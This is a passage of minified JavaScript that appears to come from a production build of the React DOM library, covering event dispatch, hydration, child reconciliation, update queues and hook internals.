w(k,f+"leave",v,t,p),h.target=x,h.relatedTarget=g,k=null,zn(p)===c&&(w=new w(m,f+"enter",y,t,p),w.target=g,w.relatedTarget=x,k=w),x=k,v&&y)n:{for(w=v,m=y,f=0,g=w;g;g=nt(g))f++;for(g=0,k=m;k;k=nt(k))g++;for(;0<f-g;)w=nt(w),f--;for(;0<g-f;)m=nt(m),g--;for(;f--;){if(w===m||m!==null&&w===m.alternate)break n;w=nt(w),m=nt(m)}w=null}else w=null;v!==null&&Bo(d,h,v,w,!1),y!==null&&x!==null&&Bo(d,x,y,w,!0)}}e:{if(h=c?lt(c):window,v=h.nodeName&&h.nodeName.toLowerCase(),v==="select"||v==="input"&&h.type==="file")var _=Rf;else if(Ro(h))if(Zu)_=Mf;else{_=jf;var T=Of}else(v=h.nodeName)&&v.toLowerCase()==="input"&&(h.type==="checkbox"||h.type==="radio")&&(_=If);if(_&&(_=_(e,c))){Qu(d,_,t,p);break e}T&&T(e,h,c),e==="focusout"&&(T=h._wrapperState)&&T.controlled&&h.type==="number"&&ca(h,"number",h.value)}switch(T=c?lt(c):window,e){case"focusin":(Ro(T)||T.contentEditable==="true")&&(it=T,ba=c,ns=null);break;case"focusout":ns=ba=it=null;break;case"mousedown":xa=!0;break;case"contextmenu":case"mouseup":case"dragend":xa=!1,Do(d,t,p);break;case"selectionchange":if(Ff)break;case"keydown":case"keyup":Do(d,t,p)}var C;if(Sl)e:{switch(e){case"compositionstart":var E="onCompositionStart";break e;case"compositionend":E="onCompositionEnd";break e;case"compositionupdate":E="onCompositionUpdate";break e}E=void 0}else rt?Xu(e,t)&&(E="onCompositionEnd"):e==="keydown"&&t.keyCode===229&&(E="onCompositionStart");E&&(qu&&t.locale!=="ko"&&(rt||E!=="onCompositionStart"?E==="onCompositionEnd"&&rt&&(C=Yu()):(gn=p,kl="value"in gn?gn.value:gn.textContent,rt=!0)),T=Pr(c,E),0<T.length&&(E=new No(E,e,null,t,p),d.push({event:E,listeners:T}),C?E.data=C:(C=Ku(t),C!==null&&(E.data=C)))),(C=Cf?Nf(e,t):Af(e,t))&&(c=Pr(c,"onBeforeInput"),0<c.length&&(p=new No("onBeforeInput","beforeinput",null,t,p),d.push({event:p,listeners:c}),p.data=C))}op(d,n)})}function ms(e,n,t){return{instance:e,listener:n,currentTarget:t}}function Pr(e,n){for(var t=n+"Capture",s=[];e!==null;){var r=e,i=r.stateNode;r.tag===5&&i!==null&&(r=i,i=os(e,t),i!=null&&s.unshift(ms(e,i,r)),i=os(e,n),i!=null&&s.push(ms(e,i,r))),e=e.return}return s}function nt(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function Bo(e,n,t,s,r){for(var i=n._reactName,a=[];t!==null&&t!==s;){var l=t,o=l.alternate,c=l.stateNode;if(o!==null&&o===s)break;l.tag===5&&c!==null&&(l=c,r?(o=os(t,i),o!=null&&a.unshift(ms(t,o,l))):r||(o=os(t,i),o!=null&&a.push(ms(t,o,l)))),t=t.return}a.length!==0&&e.push({event:n,listeners:a})}var Vf=/\r\n?/g,Wf=/\u0000|\uFFFD/g;function Uo(e){return(typeof e=="string"?e:""+e).replace(Vf,`
`).replace(Wf,"")}function Ks(e,n,t){if(n=Uo(n),Uo(e)!==n&&t)throw Error(S(425))}function Lr(){}var Sa=null,_a=null;function Ea(e,n){return e==="textarea"||e==="noscript"||typeof n.children=="string"||typeof n.children=="number"||typeof n.dangerouslySetInnerHTML=="object"&&n.dangerouslySetInnerHTML!==null&&n.dangerouslySetInnerHTML.__html!=null}var Ta=typeof setTimeout=="function"?setTimeout:void 0,$f=typeof clearTimeout=="function"?clearTimeout:void 0,Ho=typeof Promise=="function"?Promise:void 0,Gf=typeof queueMicrotask=="function"?queueMicrotask:typeof Ho<"u"?function(e){return Ho.resolve(null).then(e).catch(Yf)}:Ta;function Yf(e){setTimeout(function(){throw e})}function Ui(e,n){var t=n,s=0;do{var r=t.nextSibling;if(e.removeChild(t),r&&r.nodeType===8)if(t=r.data,t==="/$"){if(s===0){e.removeChild(r),ps(n);return}s--}else t!=="$"&&t!=="$?"&&t!=="$!"||s++;t=r}while(t);ps(n)}function xn(e){for(;e!=null;e=e.nextSibling){var n=e.nodeType;if(n===1||n===3)break;if(n===8){if(n=e.data,n==="$"||n==="$!"||n==="$?")break;if(n==="/$")return null}}return e}function Vo(e){e=e.previousSibling;for(var n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="$"||t==="$!"||t==="$?"){if(n===0)return e;n--}else t==="/$"&&n++}e=e.previousSibling}return null}var Rt=Math.random().toString(36).slice(2),Ve="__reactFiber$"+Rt,gs="__reactProps$"+Rt,tn="__reactContainer$"+Rt,Ca="__reactEvents$"+Rt,qf="__reactListeners$"+Rt,Xf="__reactHandles$"+Rt;function zn(e){var n=e[Ve];if(n)return n;for(var t=e.parentNode;t;){if(n=t[tn]||t[Ve]){if(t=n.alternate,n.child!==null||t!==null&&t.child!==null)for(e=Vo(e);e!==null;){if(t=e[Ve])return t;e=Vo(e)}return n}e=t,t=e.parentNode}return null}function Rs(e){return e=e[Ve]||e[tn],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function lt(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(S(33))}function ai(e){return e[gs]||null}var Na=[],ot=-1;function Ln(e){return{current:e}}function F(e){0>ot||(e.current=Na[ot],Na[ot]=null,ot--)}function D(e,n){ot++,Na[ot]=e.current,e.current=n}var An={},le=Ln(An),me=Ln(!1),Gn=An;function xt(e,n){var t=e.type.contextTypes;if(!t)return An;var s=e.stateNode;if(s&&s.__reactInternalMemoizedUnmaskedChildContext===n)return s.__reactInternalMemoizedMaskedChildContext;var r={},i;for(i in t)r[i]=n[i];return s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=n,e.__reactInternalMemoizedMaskedChildContext=r),r}function ge(e){return e=e.childContextTypes,e!=null}function Rr(){F(me),F(le)}function Wo(e,n,t){if(le.current!==An)throw Error(S(168));D(le,n),D(me,t)}function up(e,n,t){var s=e.stateNode;if(n=n.childContextTypes,typeof s.getChildContext!="function")return t;s=s.getChildContext();for(var r in s)if(!(r in n))throw Error(S(108,Rh(e)||"Unknown",r));return V({},t,s)}function Or(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||An,Gn=le.current,D(le,e),D(me,me.current),!0}function $o(e,n,t){var s=e.stateNode;if(!s)throw Error(S(169));t?(e=up(e,n,Gn),s.__reactInternalMemoizedMergedChildContext=e,F(me),F(le),D(le,e)):F(me),D(me,t)}var Qe=null,li=!1,Hi=!1;function pp(e){Qe===null?Qe=[e]:Qe.push(e)}function Kf(e){li=!0,pp(e)}function Rn(){if(!Hi&&Qe!==null){Hi=!0;var e=0,n=M;try{var t=Qe;for(M=1;e<t.length;e++){var s=t[e];do s=s(!0);while(s!==null)}Qe=null,li=!1}catch(r){throw Qe!==null&&(Qe=Qe.slice(e+1)),Mu(gl,Rn),r}finally{M=n,Hi=!1}}return null}var ct=[],ut=0,jr=null,Ir=0,_e=[],Ee=0,Yn=null,Ze=1,Je="";function Mn(e,n){ct[ut++]=Ir,ct[ut++]=jr,jr=e,Ir=n}function dp(e,n,t){_e[Ee++]=Ze,_e[Ee++]=Je,_e[Ee++]=Yn,Yn=e;var s=Ze;e=Je;var r=32-Me(s)-1;s&=~(1<<r),t+=1;var i=32-Me(n)+r;if(30<i){var a=r-r%5;i=(s&(1<<a)-1).toString(32),s>>=a,r-=a,Ze=1<<32-Me(n)+r|t<<r|s,Je=i+e}else Ze=1<<i|t<<r|s,Je=e}function El(e){e.return!==null&&(Mn(e,1),dp(e,1,0))}function Tl(e){for(;e===jr;)jr=ct[--ut],ct[ut]=null,Ir=ct[--ut],ct[ut]=null;for(;e===Yn;)Yn=_e[--Ee],_e[Ee]=null,Je=_e[--Ee],_e[Ee]=null,Ze=_e[--Ee],_e[Ee]=null}var ke=null,we=null,B=!1,Oe=null;function hp(e,n){var t=Te(5,null,null,0);t.elementType="DELETED",t.stateNode=n,t.return=e,n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)}function Go(e,n){switch(e.tag){case 5:var t=e.type;return n=n.nodeType!==1||t.toLowerCase()!==n.nodeName.toLowerCase()?null:n,n!==null?(e.stateNode=n,ke=e,we=xn(n.firstChild),!0):!1;case 6:return n=e.pendingProps===""||n.nodeType!==3?null:n,n!==null?(e.stateNode=n,ke=e,we=null,!0):!1;case 13:return n=n.nodeType!==8?null:n,n!==null?(t=Yn!==null?{id:Ze,overflow:Je}:null,e.memoizedState={dehydrated:n,treeContext:t,retryLane:1073741824},t=Te(18,null,null,0),t.stateNode=n,t.return=e,e.child=t,ke=e,we=null,!0):!1;default:return!1}}function Aa(e){return(e.mode&1)!==0&&(e.flags&128)===0}function Pa(e){if(B){var n=we;if(n){var t=n;if(!Go(e,n)){if(Aa(e))throw Error(S(418));n=xn(t.nextSibling);var s=ke;n&&Go(e,n)?hp(s,t):(e.flags=e.flags&-4097|2,B=!1,ke=e)}}else{if(Aa(e))throw Error(S(418));e.flags=e.flags&-4097|2,B=!1,ke=e}}}function Yo(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;ke=e}function Qs(e){if(e!==ke)return!1;if(!B)return Yo(e),B=!0,!1;var n;if((n=e.tag!==3)&&!(n=e.tag!==5)&&(n=e.type,n=n!=="head"&&n!=="body"&&!Ea(e.type,e.memoizedProps)),n&&(n=we)){if(Aa(e))throw fp(),Error(S(418));for(;n;)hp(e,n),n=xn(n.nextSibling)}if(Yo(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(S(317));e:{for(e=e.nextSibling,n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="/$"){if(n===0){we=xn(e.nextSibling);break e}n--}else t!=="$"&&t!=="$!"&&t!=="$?"||n++}e=e.nextSibling}we=null}}else we=ke?xn(e.stateNode.nextSibling):null;return!0}function fp(){for(var e=we;e;)e=xn(e.nextSibling)}function St(){we=ke=null,B=!1}function Cl(e){Oe===null?Oe=[e]:Oe.push(e)}var Qf=ln.ReactCurrentBatchConfig;function Ft(e,n,t){if(e=t.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(t._owner){if(t=t._owner,t){if(t.tag!==1)throw Error(S(309));var s=t.stateNode}if(!s)throw Error(S(147,e));var r=s,i=""+e;return n!==null&&n.ref!==null&&typeof n.ref=="function"&&n.ref._stringRef===i?n.ref:(n=function(a){var l=r.refs;a===null?delete l[i]:l[i]=a},n._stringRef=i,n)}if(typeof e!="string")throw Error(S(284));if(!t._owner)throw Error(S(290,e))}return e}function Zs(e,n){throw e=Object.prototype.toString.call(n),Error(S(31,e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e))}function qo(e){var n=e._init;return n(e._payload)}function mp(e){function n(m,f){if(e){var g=m.deletions;g===null?(m.deletions=[f],m.flags|=16):g.push(f)}}function t(m,f){if(!e)return null;for(;f!==null;)n(m,f),f=f.sibling;return null}function s(m,f){for(m=new Map;f!==null;)f.key!==null?m.set(f.key,f):m.set(f.index,f),f=f.sibling;return m}function r(m,f){return m=Tn(m,f),m.index=0,m.sibling=null,m}function i(m,f,g){return m.index=g,e?(g=m.alternate,g!==null?(g=g.index,g<f?(m.flags|=2,f):g):(m.flags|=2,f)):(m.flags|=1048576,f)}function a(m){return e&&m.alternate===null&&(m.flags|=2),m}function l(m,f,g,k){return f===null||f.tag!==6?(f=Xi(g,m.mode,k),f.return=m,f):(f=r(f,g),f.return=m,f)}function o(m,f,g,k){var _=g.type;return _===st?p(m,f,g.props.children,k,g.key):f!==null&&(f.elementType===_||typeof _=="object"&&_!==null&&_.$$typeof===pn&&qo(_)===f.type)?(k=r(f,g.props),k.ref=Ft(m,f,g),k.return=m,k):(k=wr(g.type,g.key,g.props,null,m.mode,k),k.ref=Ft(m,f,g),k.return=m,k)}function c(m,f,g,k){return f===null||f.tag!==4||f.stateNode.containerInfo!==g.containerInfo||f.stateNode.implementation!==g.implementation?(f=Ki(g,m.mode,k),f.return=m,f):(f=r(f,g.children||[]),f.return=m,f)}function p(m,f,g,k,_){return f===null||f.tag!==7?(f=Vn(g,m.mode,k,_),f.return=m,f):(f=r(f,g),f.return=m,f)}function d(m,f,g){if(typeof f=="string"&&f!==""||typeof f=="number")return f=Xi(""+f,m.mode,g),f.return=m,f;if(typeof f=="object"&&f!==null){switch(f.$$typeof){case Us:return g=wr(f.type,f.key,f.props,null,m.mode,g),g.ref=Ft(m,null,f),g.return=m,g;case tt:return f=Ki(f,m.mode,g),f.return=m,f;case pn:var k=f._init;return d(m,k(f._payload),g)}if(Wt(f)||jt(f))return f=Vn(f,m.mode,g,null),f.return=m,f;Zs(m,f)}return null}function h(m,f,g,k){var _=f!==null?f.key:null;if(typeof g=="string"&&g!==""||typeof g=="number")return _!==null?null:l(m,f,""+g,k);if(typeof g=="object"&&g!==null){switch(g.$$typeof){case Us:return g.key===_?o(m,f,g,k):null;case tt:return g.key===_?c(m,f,g,k):null;case pn:return _=g._init,h(m,f,_(g._payload),k)}if(Wt(g)||jt(g))return _!==null?null:p(m,f,g,k,null);Zs(m,g)}return null}function v(m,f,g,k,_){if(typeof k=="string"&&k!==""||typeof k=="number")return m=m.get(g)||null,l(f,m,""+k,_);if(typeof k=="object"&&k!==null){switch(k.$$typeof){case Us:return m=m.get(k.key===null?g:k.key)||null,o(f,m,k,_);case tt:return m=m.get(k.key===null?g:k.key)||null,c(f,m,k,_);case pn:var T=k._init;return v(m,f,g,T(k._payload),_)}if(Wt(k)||jt(k))return m=m.get(g)||null,p(f,m,k,_,null);Zs(f,k)}return null}function y(m,f,g,k){for(var _=null,T=null,C=f,E=f=0,I=null;C!==null&&E<g.length;E++){C.index>E?(I=C,C=null):I=C.sibling;var P=h(m,C,g[E],k);if(P===null){C===null&&(C=I);break}e&&C&&P.alternate===null&&n(m,C),f=i(P,f,E),T===null?_=P:T.sibling=P,T=P,C=I}if(E===g.length)return t(m,C),B&&Mn(m,E),_;if(C===null){for(;E<g.length;E++)C=d(m,g[E],k),C!==null&&(f=i(C,f,E),T===null?_=C:T.sibling=C,T=C);return B&&Mn(m,E),_}for(C=s(m,C);E<g.length;E++)I=v(C,m,E,g[E],k),I!==null&&(e&&I.alternate!==null&&C.delete(I.key===null?E:I.key),f=i(I,f,E),T===null?_=I:T.sibling=I,T=I);return e&&C.forEach(function(se){return n(m,se)}),B&&Mn(m,E),_}function w(m,f,g,k){var _=jt(g);if(typeof _!="function")throw Error(S(150));if(g=_.call(g),g==null)throw Error(S(151));for(var T=_=null,C=f,E=f=0,I=null,P=g.next();C!==null&&!P.done;E++,P=g.next()){C.index>E?(I=C,C=null):I=C.sibling;var se=h(m,C,P.value,k);if(se===null){C===null&&(C=I);break}e&&C&&se.alternate===null&&n(m,C),f=i(se,f,E),T===null?_=se:T.sibling=se,T=se,C=I}if(P.done)return t(m,C),B&&Mn(m,E),_;if(C===null){for(;!P.done;E++,P=g.next())P=d(m,P.value,k),P!==null&&(f=i(P,f,E),T===null?_=P:T.sibling=P,T=P);return B&&Mn(m,E),_}for(C=s(m,C);!P.done;E++,P=g.next())P=v(C,m,E,P.value,k),P!==null&&(e&&P.alternate!==null&&C.delete(P.key===null?E:P.key),f=i(P,f,E),T===null?_=P:T.sibling=P,T=P);return e&&C.forEach(function(on){return n(m,on)}),B&&Mn(m,E),_}function x(m,f,g,k){if(typeof g=="object"&&g!==null&&g.type===st&&g.key===null&&(g=g.props.children),typeof g=="object"&&g!==null){switch(g.$$typeof){case Us:e:{for(var _=g.key,T=f;T!==null;){if(T.key===_){if(_=g.type,_===st){if(T.tag===7){t(m,T.sibling),f=r(T,g.props.children),f.return=m,m=f;break e}}else if(T.elementType===_||typeof _=="object"&&_!==null&&_.$$typeof===pn&&qo(_)===T.type){t(m,T.sibling),f=r(T,g.props),f.ref=Ft(m,T,g),f.return=m,m=f;break e}t(m,T);break}else n(m,T);T=T.sibling}g.type===st?(f=Vn(g.props.children,m.mode,k,g.key),f.return=m,m=f):(k=wr(g.type,g.key,g.props,null,m.mode,k),k.ref=Ft(m,f,g),k.return=m,m=k)}return a(m);case tt:e:{for(T=g.key;f!==null;){if(f.key===T)if(f.tag===4&&f.stateNode.containerInfo===g.containerInfo&&f.stateNode.implementation===g.implementation){t(m,f.sibling),f=r(f,g.children||[]),f.return=m,m=f;break e}else{t(m,f);break}else n(m,f);f=f.sibling}f=Ki(g,m.mode,k),f.return=m,m=f}return a(m);case pn:return T=g._init,x(m,f,T(g._payload),k)}if(Wt(g))return y(m,f,g,k);if(jt(g))return w(m,f,g,k);Zs(m,g)}return typeof g=="string"&&g!==""||typeof g=="number"?(g=""+g,f!==null&&f.tag===6?(t(m,f.sibling),f=r(f,g),f.return=m,m=f):(t(m,f),f=Xi(g,m.mode,k),f.return=m,m=f),a(m)):t(m,f)}return x}var _t=mp(!0),gp=mp(!1),Mr=Ln(null),Dr=null,pt=null,Nl=null;function Al(){Nl=pt=Dr=null}function Pl(e){var n=Mr.current;F(Mr),e._currentValue=n}function La(e,n,t){for(;e!==null;){var s=e.alternate;if((e.childLanes&n)!==n?(e.childLanes|=n,s!==null&&(s.childLanes|=n)):s!==null&&(s.childLanes&n)!==n&&(s.childLanes|=n),e===t)break;e=e.return}}function yt(e,n){Dr=e,Nl=pt=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&n&&(he=!0),e.firstContext=null)}function Ne(e){var n=e._currentValue;if(Nl!==e)if(e={context:e,memoizedValue:n,next:null},pt===null){if(Dr===null)throw Error(S(308));pt=e,Dr.dependencies={lanes:0,firstContext:e}}else pt=pt.next=e;return n}var Fn=null;function Ll(e){Fn===null?Fn=[e]:Fn.push(e)}function vp(e,n,t,s){var r=n.interleaved;return r===null?(t.next=t,Ll(n)):(t.next=r.next,r.next=t),n.interleaved=t,sn(e,s)}function sn(e,n){e.lanes|=n;var t=e.alternate;for(t!==null&&(t.lanes|=n),t=e,e=e.return;e!==null;)e.childLanes|=n,t=e.alternate,t!==null&&(t.childLanes|=n),t=e,e=e.return;return t.tag===3?t.stateNode:null}var dn=!1;function Rl(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function yp(e,n){e=e.updateQueue,n.updateQueue===e&&(n.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function en(e,n){return{eventTime:e,lane:n,tag:0,payload:null,callback:null,next:null}}function Sn(e,n,t){var s=e.updateQueue;if(s===null)return null;if(s=s.shared,j&2){var r=s.pending;return r===null?n.next=n:(n.next=r.next,r.next=n),s.pending=n,sn(e,t)}return r=s.interleaved,r===null?(n.next=n,Ll(s)):(n.next=r.next,r.next=n),s.interleaved=n,sn(e,t)}function hr(e,n,t){if(n=n.updateQueue,n!==null&&(n=n.shared,(t&4194240)!==0)){var s=n.lanes;s&=e.pendingLanes,t|=s,n.lanes=t,vl(e,t)}}function Xo(e,n){var t=e.updateQueue,s=e.alternate;if(s!==null&&(s=s.updateQueue,t===s)){var r=null,i=null;if(t=t.firstBaseUpdate,t!==null){do{var a={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};i===null?r=i=a:i=i.next=a,t=t.next}while(t!==null);i===null?r=i=n:i=i.next=n}else r=i=n;t={baseState:s.baseState,firstBaseUpdate:r,lastBaseUpdate:i,shared:s.shared,effects:s.effects},e.updateQueue=t;return}e=t.lastBaseUpdate,e===null?t.firstBaseUpdate=n:e.next=n,t.lastBaseUpdate=n}function zr(e,n,t,s){var r=e.updateQueue;dn=!1;var i=r.firstBaseUpdate,a=r.lastBaseUpdate,l=r.shared.pending;if(l!==null){r.shared.pending=null;var o=l,c=o.next;o.next=null,a===null?i=c:a.next=c,a=o;var p=e.alternate;p!==null&&(p=p.updateQueue,l=p.lastBaseUpdate,l!==a&&(l===null?p.firstBaseUpdate=c:l.next=c,p.lastBaseUpdate=o))}if(i!==null){var d=r.baseState;a=0,p=c=o=null,l=i;do{var h=l.lane,v=l.eventTime;if((s&h)===h){p!==null&&(p=p.next={eventTime:v,lane:0,tag:l.tag,payload:l.payload,callback:l.callback,next:null});e:{var y=e,w=l;switch(h=n,v=t,w.tag){case 1:if(y=w.payload,typeof y=="function"){d=y.call(v,d,h);break e}d=y;break e;case 3:y.flags=y.flags&-65537|128;case 0:if(y=w.payload,h=typeof y=="function"?y.call(v,d,h):y,h==null)break e;d=V({},d,h);break e;case 2:dn=!0}}l.callback!==null&&l.lane!==0&&(e.flags|=64,h=r.effects,h===null?r.effects=[l]:h.push(l))}else v={eventTime:v,lane:h,tag:l.tag,payload:l.payload,callback:l.callback,next:null},p===null?(c=p=v,o=d):p=p.next=v,a|=h;if(l=l.next,l===null){if(l=r.shared.pending,l===null)break;h=l,l=h.next,h.next=null,r.lastBaseUpdate=h,r.shared.pending=null}}while(!0);if(p===null&&(o=d),r.baseState=o,r.firstBaseUpdate=c,r.lastBaseUpdate=p,n=r.shared.interleaved,n!==null){r=n;do a|=r.lane,r=r.next;while(r!==n)}else i===null&&(r.shared.lanes=0);Xn|=a,e.lanes=a,e.memoizedState=d}}function Ko(e,n,t){if(e=n.effects,n.effects=null,e!==null)for(n=0;n<e.length;n++){var s=e[n],r=s.callback;if(r!==null){if(s.callback=null,s=t,typeof r!="function")throw Error(S(191,r));r.call(s)}}}var Os={},$e=Ln(Os),vs=Ln(Os),ys=Ln(Os);function Bn(e){if(e===Os)throw Error(S(174));return e}function Ol(e,n){switch(D(ys,n),D(vs,e),D($e,Os),e=n.nodeType,e){case 9:case 11:n=(n=n.documentElement)?n.namespaceURI:pa(null,"");break;default:e=e===8?n.parentNode:n,n=e.namespaceURI||null,e=e.tagName,n=pa(n,e)}F($e),D($e,n)}function Et(){F($e),F(vs),F(ys)}function wp(e){Bn(ys.current);var n=Bn($e.current),t=pa(n,e.type);n!==t&&(D(vs,e),D($e,t))}function jl(e){vs.current===e&&(F($e),F(vs))}var U=Ln(0);function Fr(e){for(var n=e;n!==null;){if(n.tag===13){var t=n.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||t.data==="$!"))return n}else if(n.tag===19&&n.memoizedProps.revealOrder!==void 0){if(n.flags&128)return n}else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return null;n=n.return}n.sibling.return=n.return,n=n.sibling}return null}var Vi=[];function Il(){for(var e=0;e<Vi.length;e++)Vi[e]._workInProgressVersionPrimary=null;Vi.length=0}var fr=ln.ReactCurrentDispatcher,Wi=ln.ReactCurrentBatchConfig,qn=0,H=null,X=null,Z=null,Br=!1,ts=!1,ws=0,Zf=0;function re(){throw Error(S(321))}function Ml(e,n){if(n===null)return!1;for(var t=0;t<n.length&&t<e.length;t++)if(!ze(e[t],n[t]))return!1;return!0}function Dl(e,n,t,s,r,i){if(qn=i,H=n,n.memoizedState=null,n.updateQueue=null,n.lanes=0,fr.current=e===null||e.memoizedState===null?tm:sm,e=t(s,r),ts){i=0;do{if(ts=!1,ws=0,25<=i)throw Error(S(301));i+=1,Z=X=null,n.updateQueue=null,fr.current=rm,e=t(s,r)}while(ts)}if(fr.current=Ur,n=X!==null&&X.next!==null,qn=0,Z=X=H=null,Br=!1,n)throw Error(S(300));return e}function zl(){var e=ws!==0;return ws=0,e}function He(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Z===null?H.memoizedState=Z=e:Z=Z.next=e,Z}function Ae(){if(X===null){var e=H.alternate;e=e!==null?e.memoizedState:null}else e=X.next;var n=Z===null?H.memoizedState:Z.next;if(n!==null)Z=n,X=e;else{if(e===null)throw Error(S(310));X=e,e={memoizedState:X.memoizedState,baseState:X.baseState,baseQueue:X.baseQueue,queue:X.queue,next:null},Z===null?H.memoizedState=Z=e:Z=Z.next=e}return Z}function ks(e,n){return typeof n=="function"?n(e):n}function $i(e){var n=Ae(),t=n.queue;if(t===null)throw Error(S(311));t.lastRenderedReducer=e;var s=X,r=s.baseQueue,i=t.pending;if(i!==null){if(r!==null){var a=r.next;r.next=i.next,i.next=a}s.baseQueue=r=i,t.pending=null}if(r!==null){i=r.next,s=s.baseState;var l=a=null,o=null,c=i;do{var p=c.lane;if((qn&p)===p)o!==null&&(o=o.next={lane:0,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null}),s=c.hasEagerState?c.eagerState:e(s,c.action);else{var d={lane:p,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null};o===null?(l=o=d,a=s):o=o.next=d,H.lanes|=p,Xn|=p}c=c.next}while(c!==null&&c!==i);o===null?a=s:o.next=l,ze(s,n.memoizedState)||(he=!0),n.memoizedState=s,n.baseState=a,n.baseQueue=o,t.lastRenderedState=s}if(e=t.interleaved,e!==null){r=e;do i=r.lane,H.lanes|=i,Xn|=i,r=r.next;while(r!==e)}else r===null&&(t.lanes=0);return[n.memoizedState,t.dispatch]}function Gi(e){var n=Ae(),t=n.queue;if(t===null)throw Error(S(311));t.lastRenderedReducer=e;var s=t.dispatch,r=t.pending,i=n.memoizedState;if(r!==null){t.pending=null;var a=r=r.next;do i=e(i,a.action),a=a.next;while(a!==r);ze(i,n.memoizedState)||(he=!0),n.memoizedState=i,n.baseQueue===null&&(n.baseState=i),t.lastRenderedState=i}return[i,s]}function kp(){}function bp(e,n){var t=H,s=Ae(),r=n(),i=!ze(s.memoizedState,r);if(i&&(s.memoizedState=r,he=!0),s=s.queue,Fl(_p.bind(null,t,s,e),[e]),s.getSnapshot!==n||i||Z!==null&&Z.memoizedState.tag&1){if(t.flags|=2048,bs(9,Sp.bind(null,t,s,r,n),void 0,null),J===null)throw Error(S(349));qn&30||xp(t,n,r)}return r}function xp(e,n,t){e.flags|=16384,e={getSnapshot:n,value:t},n=H.updateQueue,n===null?(n={lastEffect:null,stores:null},H.updateQueue=n,n.stores=[e]):(t=n.stores,t===null?n.stores=[e]:t.push(e))}function Sp(e,n,t,s){n.value=t,n.getSnapshot=s,Ep(n)&&Tp(e)}function _p(e,n,t){return t(function(){Ep(n)&&Tp(e)})}function Ep(e){var n=e.getSnapshot;e=e.value;try{var t=n();return!ze(e,t)}catch{return!0}}function Tp(e){var n=sn(e,1);n!==null&&De(n,e,1,-1)}function Qo(e){var n=He();return typeof e=="function"&&(e=e()),n.memoizedState=n.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:ks,lastRenderedState:e},n.queue=e,e=e.dispatch=nm.bind(null,H,e),[n.memoizedState,e]}function bs(e,n,t,s){return e={tag:e,create:n,destroy:t,deps:s,next:null},n=H.updateQueue,n===null?(n={lastEffect:null,stores:null},H.updateQueue=n,n.lastEffect=e.next=e):(t=n.lastEffect,t===null?n.lastEffect=e.next=e:(s=t.next,t.next=e,e.next=s,n.lastEffect=e)),e}function Cp(){return Ae().memoizedState}function mr(e,n,t,s){var r=He();H.flags|=e,r.memoizedState=bs(1|n,t,void 0,s===void 0?null:s)}function oi(e,n,t,s){var r=Ae();s=s===void 0?null:s;var i=void 0;if(X!==null){var a=X.memoizedState;if(i=a.destroy,s!==null&&Ml(s,a.deps)){r.memoizedState=bs(n,t,i,s);return}}H.flags|=e,r.memoizedState=bs(1|n,t,i,s)}function Zo(e,n){return mr(8390656,8,e,n)}function Fl(e,n){return oi(2048,8,e,n)}function Np(e,n){return oi(4,2,e,n)}function Ap(e,n){return oi(4,4,e,n)}function Pp(e,n){if(typeof n=="function")return e=e(),n(e),function(){n(null)};if(n!=null)return e=e(),n.current=e,function(){n.current=null}}function Lp(e,n,t){return t=t!=null?t.concat([e]):null,oi(4,4,Pp.bind(null,n,e),t)}function Bl(){}function Rp(e,n){var t=Ae();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&Ml(n,s[1])?s[0]:(t.memoizedState=[e,n],e)}function Op(e,n){var t=Ae();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&Ml(n,s[1])?s[0]:(e=e(),t.memoizedState=[e,n],e)}function jp(e,n,t){return qn&21?(ze(t,n)||(t=Fu(),H.lanes|=t,Xn|=t,e.baseState=!0),n):(e.baseState&&(e.baseState=!1,he=!0),e.memoizedState=t)}function Jf(e,n){var t=M;M=t!==0&&4>t?t:4,e(!0);var s=Wi.transition;Wi.transition={};try{e(!1),n()}finally{M=t,Wi.transition=s}}function Ip(){return Ae().memoizedState}function em(e,n,t){var s=En(e);if(t={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null},Mp(e))Dp(n,t);else if(t=vp(e,n,t,s),t!==null){var r=ce();De(t,e,s,r),zp(t,n,s)}}function nm(e,n,t){var s=En(e),r={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null};if(Mp(e))Dp(n,r);else{var i=e.alternate;if(e.lanes===0&&(i===null||i.lanes===0)&&(i=n.lastRenderedReducer,i!==null))try{var a=n.lastRenderedState,l=i(a,t);if(r.hasEagerState=!0,r.eagerState=l,ze(l,a)){var o=n.interleaved;o===null?(r.next=r,Ll(n)):(r.next=o.next,o.next=r),n.interleaved=r;return}}catch{}finally{}t=vp(e,n,r,s),t!==null&&(r=ce(),De(t,e,s,r),zp(t,n,s))}}function Mp(e){var n=e.alternate;return e===H||n!==null&&n===H}function Dp(e,n){ts=Br=!0;var t=e.pending;t===null?n.next=n:(n.next=t.next,t.next=n),e.pending=n}function zp(e,n,t){if(t&4194240){var 